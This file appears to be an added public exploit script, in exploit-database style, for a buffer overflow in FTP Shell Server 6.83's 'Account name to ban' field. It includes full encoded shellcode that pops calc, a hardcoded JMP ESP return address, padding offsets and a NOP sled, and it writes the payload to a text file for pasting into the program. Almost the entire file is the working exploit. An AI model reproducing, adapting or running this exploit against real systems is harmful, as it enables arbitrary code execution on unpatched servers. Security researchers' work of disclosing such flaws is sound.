@@ -1,0 +1,50 @@
+#!/usr/bin/python
+# Exploit Title: FTP Shell Server 6.83 'Account name to ban' Buffer Overflow
+# Date: 09-04-2019
+# Exploit Author: Dino Covotsos - Telspace Systems
+# Vendor Homepage: http://www.ftpshell.com/index.htm
+# Version: 6.83
+# Software Link : http://www.ftpshell.com/downloadserver.htm
+# Contact: services[@]telspace.co.za
+# Twitter: @telspacesystems
+# Tested on: Windows XP SP3 ENG x86
+# CVE: TBC from Mitre
+# Initial DOS discovery by: Victor Mondragón
+# Created during 2019 intern training
+# Greetz Amy, Delicia, Greg, Tonderai, Nzanoa & Telspace Systems Crew
+# PoC:
+# 1.) Generate ftpshell.txt, copy the contents to clipboard
+# 2.) In the application, open 'Manage FTP Accounts' -> "Add Account Name"
+# 3.) Paste the contents of ftpshell.txt in "Account name to ban"
+# 4.) Click "OK" and calc pops
+#JMP ESP - 0x775a693b : jmp esp | asciiprint,ascii {PAGE_EXECUTE_READ} [ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6435 (C:\WINDOWS\system32\ole32.dll)
+
+
+#msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a\x7d" -f c
+shellcode = ("\xdd\xc7\xb8\xa0\x9e\x31\x11\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
+"\x31\x31\x42\x18\x03\x42\x18\x83\xc2\xa4\x7c\xc4\xed\x4c\x02"
+"\x27\x0e\x8c\x63\xa1\xeb\xbd\xa3\xd5\x78\xed\x13\x9d\x2d\x01"
+"\xdf\xf3\xc5\x92\xad\xdb\xea\x13\x1b\x3a\xc4\xa4\x30\x7e\x47"
+"\x26\x4b\x53\xa7\x17\x84\xa6\xa6\x50\xf9\x4b\xfa\x09\x75\xf9"
+"\xeb\x3e\xc3\xc2\x80\x0c\xc5\x42\x74\xc4\xe4\x63\x2b\x5f\xbf"
+"\xa3\xcd\x8c\xcb\xed\xd5\xd1\xf6\xa4\x6e\x21\x8c\x36\xa7\x78"
+"\x6d\x94\x86\xb5\x9c\xe4\xcf\x71\x7f\x93\x39\x82\x02\xa4\xfd"
+"\xf9\xd8\x21\xe6\x59\xaa\x92\xc2\x58\x7f\x44\x80\x56\x34\x02"
+"\xce\x7a\xcb\xc7\x64\x86\x40\xe6\xaa\x0f\x12\xcd\x6e\x54\xc0"
+"\x6c\x36\x30\xa7\x91\x28\x9b\x18\x34\x22\x31\x4c\x45\x69\x5f"
+"\x93\xdb\x17\x2d\x93\xe3\x17\x01\xfc\xd2\x9c\xce\x7b\xeb\x76"
+"\xab\x74\xa1\xdb\x9d\x1c\x6c\x8e\x9c\x40\x8f\x64\xe2\x7c\x0c"
+"\x8d\x9a\x7a\x0c\xe4\x9f\xc7\x8a\x14\xed\x58\x7f\x1b\x42\x58"
+"\xaa\x78\x05\xca\x36\x51\xa0\x6a\xdc\xad")
+
+buffer = "A" * 416 + "\x3b\x69\x5a\x77" + "\x90" * 20 + shellcode + "C" * 80
+
+payload = buffer
+try:
+    f=open("ftpshell.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
